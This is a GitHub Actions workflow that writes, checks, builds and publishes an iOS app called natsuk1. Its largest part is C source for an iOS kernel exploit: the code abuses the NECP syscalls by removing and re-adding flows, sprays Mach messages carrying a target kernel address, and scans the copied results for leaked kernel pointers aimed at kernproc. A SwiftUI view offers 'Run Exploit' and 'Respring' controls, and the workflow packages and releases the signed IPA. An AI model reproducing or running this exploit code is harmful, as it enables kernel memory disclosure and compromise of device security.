name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE 9

          #define NCF_ASN 0x20
          #define RESBUF 8192
          #define SPRAY_PORTS 48
          #define SPRAY_PER_PORT 6

          static const int MSG_SIZES[] = {
              768, 832, 896, 960, 1024, 1088, 1152, 1216, 1280, 1344,
              1408, 1472, 1536, 1600, 1664, 1728, 1792, 1856, 1920, 1984
          };
          #define MSG_SIZES_COUNT 20

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static void dumpw(const char *tag, const uint8_t *p, int n) {
              char line[1024];
              int off = 0;
              if (n > 12) n = 12;
              for (int i = 0; i < n; i++) {
                  uint64_t w;
                  memcpy(&w, p + i * 8, 8);
                  off += snprintf(line + off, sizeof(line) - off,
                                  "%02d:%016llx ", i, (unsigned long long)w);
                  if (off > 900) break;
              }
              LI(tag, "%s", line);
          }

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          typedef struct {
              mach_port_t ports[SPRAY_PORTS];
              int n;
          } spray_t;

          static mach_port_t port_new_send(void) {
              mach_port_t p = MACH_PORT_NULL;
              if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)
                  != KERN_SUCCESS) return MACH_PORT_NULL;
              mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              return p;
          }

          static void spray_init(spray_t *sp, int want) {
              sp->n = 0;
              if (want > SPRAY_PORTS) want = SPRAY_PORTS;
              for (int i = 0; i < want; i++) {
                  mach_port_t p = port_new_send();
                  if (p == MACH_PORT_NULL) break;
                  sp->ports[sp->n++] = p;
              }
          }

          static int spray_send_inline(spray_t *sp, int msgsz, uint64_t target_kaddr) {
              int sent = 0;
              if (msgsz < 64) return 0;
              uint8_t *mbuf = malloc((size_t)msgsz);
              if (!mbuf) return 0;
              for (int i = 0; i < sp->n; i++) {
                  for (int j = 0; j < SPRAY_PER_PORT; j++) {
                      memset(mbuf, 0, (size_t)msgsz);
                      mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
                      h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                      h->msgh_size = (mach_msg_size_t)msgsz;
                      h->msgh_remote_port = sp->ports[i];
                      h->msgh_id = 0x7000 + sent;
                      for (int off = 0x18; off + 8 <= msgsz; off += 8) {
                          if (off == (int)NCF_ASN) continue;
                          if ((off & 0xFF) == 0) {
                              *(uint64_t*)(mbuf + off) = 0x4242424242424242ULL;
                          }
                      }
                      if ((size_t)NCF_ASN + 8 <= (size_t)msgsz) {
                          *(uint64_t*)(mbuf + NCF_ASN) = target_kaddr;
                      }
                      mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                                       h->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
                      if (kr == MACH_MSG_SUCCESS) sent++;
                  }
              }
              free(mbuf);
              return sent;
          }

          static void spray_drain(spray_t *sp) {
              uint8_t buf[2048];
              mach_msg_header_t *h = (mach_msg_header_t*)buf;
              for (int i = 0; i < sp->n; i++) {
                  for (int j = 0; j < SPRAY_PER_PORT + 4; j++) {
                      h->msgh_size = sizeof(buf);
                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
                                   sp->ports[i], 20, MACH_PORT_NULL) != KERN_SUCCESS) break;
                  }
                  mach_port_destroy(mach_task_self(), sp->ports[i]);
              }
              sp->n = 0;
          }

          static int try_read_one(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret) {
              int fd = nfd();
              if (fd < 0) return -1;
              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }

              int r1 = nrm_flow(fd, fu);
              if (r1 != 0) { close(fd); return -1; }

              spray_t sp;
              spray_init(&sp, SPRAY_PORTS);
              int sent = spray_send_inline(&sp, msgsz, target);

              uint8_t f2[16];
              int r2 = nadd_flow(fd, cu, f2);

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int c = ncpy(fd, cu, buf, sizeof(buf));

              if (out_ret) *out_ret = c;
              if (out && outsz > 0 && c > 0) {
                  int n = c < outsz ? c : outsz;
                  memcpy(out, buf, n);
              }

              spray_drain(&sp);
              close(fd);
              (void)r2;
              (void)sent;
              return c;
          }

          static volatile int g_busy = 0;

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v2.6 (natsuk1-kread-v16) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
                 NCF_ASN, SPRAY_PORTS, SPRAY_PER_PORT, MSG_SIZES_COUNT);
              uint64_t kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);

              int fd = nfd();
              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("P2", "necp OK");

              uint64_t target = kbase + OFF_KERNPROC;
              LI("P3", "target=0x%llx", (unsigned long long)target);

              for (int i = 0; i < MSG_SIZES_COUNT; i++) {
                  int msgsz = MSG_SIZES[i];
                  uint8_t buf[RESBUF];
                  int r = 0;
                  int c = try_read_one(target, msgsz, buf, sizeof(buf), &r);
                  LI("TRY", "msgsz=%d ret=%d", msgsz, r);
                  if (r > 0) {
                      int has_k = 0;
                      int has_42 = 0;
                      for (int k = 0; k + 8 <= r; k++) {
                          uint64_t v;
                          memcpy(&v, buf + k, 8);
                          if (is_kptr(v)) { has_k = 1; break; }
                          if (v == 0x4242424242424242ULL) { has_42 = 1; }
                      }
                      if (has_k) {
                          dumpw("HIT", buf, r / 8);
                          for (int k = 0; k + 8 <= r; k++) {
                              uint64_t v;
                              memcpy(&v, buf + k, 8);
                              if (is_kptr(v)) {
                                  LO("HIT", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
                              }
                          }
                      } else if (has_42) {
                          LI("TRY", "msgsz=%d marker 0x42 found but no kptr", msgsz);
                          dumpw("MARK", buf, r / 8);
                      } else {
                          LI("TRY", "msgsz=%d no kptr", msgsz);
                      }
                  }
                  (void)c;
                  usleep(80000);
              }

              LI("DONE", "all sizes tried");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          NECP

      - name: Write AirliftView.swift
        run: |
          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
          import SwiftUI
          import UIKit
          import Combine

          struct AirliftView: View {
              @EnvironmentObject var airlift: AirliftBridge
              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
              @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
              @State private var deviceIP: String? = NetworkStatus.deviceIP()
              @State private var tick: UInt64 = 0

              private let ticker = Timer.publish(every: 1.0, on: .main, in: .common).autoconnect()

              var body: some View {
                  List {
                      networkSection
                      if airlift.hasPairing() {
                          exploitSection
                      } else {
                          pairingSection
                      }
                      logSection
                  }
                  .listStyle(.insetGrouped)
                  .navigationTitle("Airlift")
                  .navigationBarTitleDisplayMode(.inline)
                  .onAppear { refresh() }
                  .onReceive(ticker) { _ in refresh() }
                  .refreshable { refresh() }
                  .id(tick)
              }

              private func refresh() {
                  loopbackVPNUp = NetworkStatus.loopbackVPNUp()
                  tunnelIP = NetworkStatus.tunnelIP()
                  deviceIP = NetworkStatus.deviceIP()
                  tick &+= 1
              }

              @ViewBuilder
              private var networkSection: some View {
                  if !loopbackVPNUp {
                      Section {
                          HStack(spacing: 10) {
                              Image(systemName: "wifi.exclamationmark")
                                  .foregroundStyle(.orange)
                              VStack(alignment: .leading, spacing: 2) {
                                  Text("Loopback VPN is not active")
                                      .font(.subheadline).fontWeight(.semibold)
                                  Text("Start LocalDevVPN (10.7.0.1 / 10.7.1.1)")
                                      .font(.caption).foregroundStyle(.secondary)
                              }
                          }
                      } header: {
                          Label("Network", systemImage: "network")
                      }
                  } else {
                      Section {
                          HStack(spacing: 8) {
                              Image(systemName: "checkmark.shield.fill")
                                  .foregroundStyle(.green)
                              Text("Loopback VPN active")
                                  .font(.subheadline).fontWeight(.semibold)
                          }
                          if let t = tunnelIP {
                              HStack {
                                  Text("Tunnel")
                                  Spacer()
                                  Text(t).font(.system(size: 12, design: .monospaced))
                                      .foregroundStyle(.secondary)
                              }
                          }
                          if let d = deviceIP {
                              HStack {
                                  Text("Device")
                                  Spacer()
                                  Text(d).font(.system(size: 12, design: .monospaced))
                                      .foregroundStyle(.secondary)
                              }
                          }
                      } header: {
                          Label("Network", systemImage: "network")
                      }
                  }
              }

              @ViewBuilder
              private var pairingSection: some View {
                  Section {
                      HStack(spacing: 8) {
                          Image(systemName: pairingStatusIcon)
                              .foregroundStyle(pairingStatusColor)
                          Text(pairingStatusText).font(.subheadline.bold())
                      }
                      if case .pairing = airlift.state {
                          HStack(spacing: 8) {
                              ProgressView().scaleEffect(0.85)
                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
                                  .font(.subheadline).foregroundStyle(.secondary)
                          }
                      }
                      if let pin = airlift.pairPIN {
                          VStack(alignment: .leading, spacing: 8) {
                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced))
                                  .foregroundStyle(.orange)
                              Button {
                                  if let url = URL(string: UIApplication.openSettingsURLString) {
                                      UIApplication.shared.open(url)
                                  }
                              } label: {
                                  Label("Open Settings", systemImage: "arrow.up.forward.app")
                                      .frame(maxWidth: .infinity)
                              }
                              .buttonStyle(.borderedProminent).tint(.orange)
                          }
                          .padding(12)
                          .background(Color.orange.opacity(0.12),
                                      in: RoundedRectangle(cornerRadius: 12))
                      }
                  } header: {
                      Label("Pairing", systemImage: "link.circle")
                  }

                  Section {
                      if case .pairing = airlift.state {
                          Button(role: .destructive) { airlift.cancelPairing() } label: {
                              Text("Cancel Pairing").frame(maxWidth: .infinity)
                          }
                      } else {
                          Button { airlift.runPairing() } label: {
                              Text("Start Pairing").frame(maxWidth: .infinity)
                          }
                      }
                  }
              }

              private var pairingStatusText: String {
                  switch airlift.state {
                  case .pairing: return "Pairing…"
                  case .ready:   return "Paired"
                  case .running: return "Exploit running…"
                  case .done(let ok, _): return ok ? "Done" : "Failed"
                  default:       return "Not paired"
                  }
              }

              private var pairingStatusIcon: String {
                  switch airlift.state {
                  case .pairing: return "hourglass"
                  case .ready:   return "link.circle.fill"
                  case .running: return "bolt.fill"
                  case .done(let ok, _): return ok ? "checkmark.circle.fill" : "xmark.circle.fill"
                  default:       return "link.badge.plus"
                  }
              }

              private var pairingStatusColor: Color {
                  switch airlift.state {
                  case .pairing: return .orange
                  case .ready:   return .green
                  case .running: return .orange
                  case .done(let ok, _): return ok ? .green : .red
                  default:       return .orange
                  }
              }

              @ViewBuilder
              private var exploitSection: some View {
                  Section {
                      HStack {
                          Image(systemName: "link.circle.fill").foregroundStyle(.green)
                          Text("Paired").font(.subheadline.bold())
                      }
                      HStack {
                          Text("Target")
                          Spacer()
                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
                              get: { airlift.target }, set: { airlift.target = $0 }))
                              .font(.system(size: 12, design: .monospaced))
                              .multilineTextAlignment(.trailing)
                              .autocorrectionDisabled()
                              .textInputAutocapitalization(.never)
                      }
                  } header: {
                      Label("Pairing", systemImage: "link.circle")
                  }

                  Section {
                      Button { airlift.runExploit() } label: {
                          HStack {
                              Image(systemName: "bolt.fill")
                              Text("Run Exploit")
                          }
                      }
                      .disabled(airlift.state == .running || !loopbackVPNUp)

                      Button { airlift.respring() } label: {
                          HStack {
                              Image(systemName: "arrow.clockwise")
                              Text("Respring")
                          }
                      }
                      .disabled(airlift.state == .running)
                  } header: {
                      Label("Exploit", systemImage: "bolt.shield")
                  }

                  Section {
                      Button(role: .destructive) { airlift.deletePairing() } label: {
                          Text("Delete Pairing").frame(maxWidth: .infinity)
                      }
                  }
              }

              @ViewBuilder
              private var logSection: some View {
                  Section {
                      LogTerminal(text: airlift.exploitLog.isEmpty
                                  ? "No output yet."
                                  : airlift.exploitLog.joined(separator: "\n"))
                  } header: {
                      Label("Log", systemImage: "terminal")
                  }
              }
          }
          SWIFT

      - name: Verify
        run: |
          F=natsuk1/Exploit/necp.c
          A=natsuk1/Views/AirliftView.swift
          FAIL=0
          chk() {
            if eval "$2" >/dev/null 2>&1; then
              echo "  OK   $1"
            else
              echo "  FAIL $1"
              FAIL=1
            fi
          }
          echo "--- necp.c ---"
          chk "NCF_ASN 0x20"     "grep -q -e 'NCF_ASN 0x20' $F"
          chk "marker v16"       "grep -q -e 'natsuk1-kread-v16' $F"
          chk "MSG_SIZES array"  "grep -q -e 'static const int MSG_SIZES' $F"
          chk "spray_send_inline" "grep -q -e 'spray_send_inline' $F"
          chk "nk_necp_run"      "grep -q -e 'int nk_necp_run(void)' $F"
          echo "--- AirliftView.swift ---"
          chk "ticker"           "grep -q -e 'Timer.publish' $A"
          chk "onReceive"        "grep -q -e 'onReceive(ticker)' $A"
          chk "refresh func"     "grep -q -e 'private func refresh' $A"
          chk "loopback check"   "grep -q -e 'loopbackVPNUp' $A"
          chk "tunnelIP"         "grep -q -e 'tunnelIP' $A"
          chk "deviceIP"         "grep -q -e 'deviceIP' $A"
          chk "wifi.exclamationmark" "grep -q -e 'wifi.exclamationmark' $A"
          chk "checkmark.shield" "grep -q -e 'checkmark.shield.fill' $A"
          chk "link.circle"      "grep -q -e 'link.circle' $A"
          chk "bolt.shield"      "grep -q -e 'bolt.shield' $A"
          chk "exploitSection"   "grep -q -e 'exploitSection' $A"
          echo "--- syntax ---"
          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
            echo "  OK   clang syntax"
          else
            echo "  FAIL clang syntax"
            FAIL=1
          fi
          if [ "$FAIL" -ne 0 ]; then
            echo "VERIFY FAILED"
            exit 1
          fi
          echo "VERIFY OK"

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "kread v16 wide msgsz sweep, Airlift live refresh"

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Exploit/necp.c natsuk1/Views/AirliftView.swift
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "kread v16 + Airlift live refresh [skip ci]"
          git push